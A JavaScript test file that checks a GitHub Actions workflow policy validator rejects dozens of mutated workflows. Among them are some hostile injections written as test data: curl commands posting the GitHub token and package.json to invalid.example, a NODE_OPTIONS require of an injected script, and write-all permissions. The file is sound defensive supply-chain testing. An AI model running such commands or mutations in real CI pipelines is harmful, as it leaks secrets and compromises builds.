import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { validatePreparationWorkflow } from "../scripts/supply-chain/workflow-policy.mjs";

const workflow = readFileSync(new URL("../.github/workflows/native-bootstrap.yml", import.meta.url), "utf8").replaceAll("\r\n", "\n");

test("actual new workflow has bounded read-only dormant preparation capability", () => {
  assert.deepEqual(validatePreparationWorkflow(workflow).capabilities, []);
  assert.match(workflow, /persist-credentials: false/u);
  assert.match(workflow, /node --test tests\/supply-chain-dormant\.test\.mjs/u);
});

test("workflow policy rejects privilege, trigger, action and runner mutations", () => {
  for (const mutated of [
    workflow.replace("contents: read", "contents: write"),
    workflow.replace("contents: read", "contents: read\n  packages: write"),
    workflow.replace("contents: read", "contents: read\n  id-token: write"),
    workflow.replace("pull_request:", "pull_request_target:"),
    workflow.replace("pull_request:", "workflow_dispatch:"),
    workflow.replace("needs: policy", "needs: policy\n    environment: signing"),
    workflow.replace("BOOTSTRAP_TOOL: ${{ matrix.tool }}", "TOKEN: ${{ secrets.KEY }}"),
    workflow.replace("actions/checkout@11d5960a326750d5838078e36cf38b85af677262", "actions/checkout@v4"),
    workflow.replace("persist-credentials: false", "persist-credentials: true"),
    workflow.replace("ref: ${{ github.sha }}", "ref: main"),
    workflow.replace("runs-on: ubuntu-24.04", "runs-on: self-hosted"),
    workflow.replace("permissions:\n  contents: read", "permissions: write-all"),
    workflow.replace("contents: read", "contents: read\n  actions: write"),
    workflow.replace("persist-credentials: false", "persist-credentials: true\n        env:\n          persist-credentials: false"),
    workflow.replace("run: node scripts/supply-chain/dormant.mjs status", "run: curl --data '${{ github.token }}' https://invalid.example"),
    workflow.replace("run: node scripts/supply-chain/dormant.mjs status", "run: curl --data '${{ github['token'] }}' https://invalid.example"),
    workflow.replace("run: node scripts/supply-chain/dormant.mjs status", "run: node -e 'process.exit(0)'"),
    workflow.replace("    steps:\n", "    steps:\n      - run: curl --data-binary @package.json https://invalid.example/collect\n"),
    workflow.replace("${{ runner.temp }}/native-lock-${{ matrix.tool }}.json", "/home/runner"),
    workflow.replace("if-no-files-found: error", "if-no-files-found: ignore"),
    workflow.replace("node-version: 22.23.2", "node-version: 22.23.2\n          cache: npm"),
    workflow.replace("uses: actions/setup-node@", "env:\n          NODE_OPTIONS: --require ./injected.cjs\n        uses: actions/setup-node@"),
    workflow.replace("merge-multiple: false", "merge-multiple: true"),
    workflow.replace("pattern: native-candidate-*", "pattern: '*'"),
    workflow.replace("pattern: native-candidate-*", "pattern: native-candidate-*\n          run-id: 123"),
    workflow.replace("repeat: 2", "repeat: 1"),
    workflow.replace("needs: native-build", "needs: policy"),
    workflow.replace("needs: native-reproducibility", "needs: policy"),
    workflow.replace("--repeat \"$BOOTSTRAP_REPEAT\"", "--repeat 1"),
    workflow.replace("path: ${{ runner.temp }}/native-cli", "path: ${{ runner.temp }}"),
    workflow.replace("path: ${{ runner.temp }}/native-audit", "path: ${{ runner.temp }}"),
    workflow.replace("run: node scripts/supply-chain/native-scan.mjs", "continue-on-error: true\n        run: node scripts/supply-chain/native-scan.mjs"),
    workflow.replace("timeout-minutes: 45", "timeout-minutes: 90"),
    workflow.replace("run: node --test tests/supply-chain-dormant.test.mjs", "run: node scripts/supply-chain/dormant.mjs status"),
    workflow.replace("run: node --test tests/supply-chain-dormant.test.mjs", "run: node -e 'process.exit(0)'"),
    workflow.replace("needs: [native-reproducibility, native-cli, native-audit, baseline-comparison]", "needs: policy"),
  ]) assert.throws(() => validatePreparationWorkflow(mutated));
});
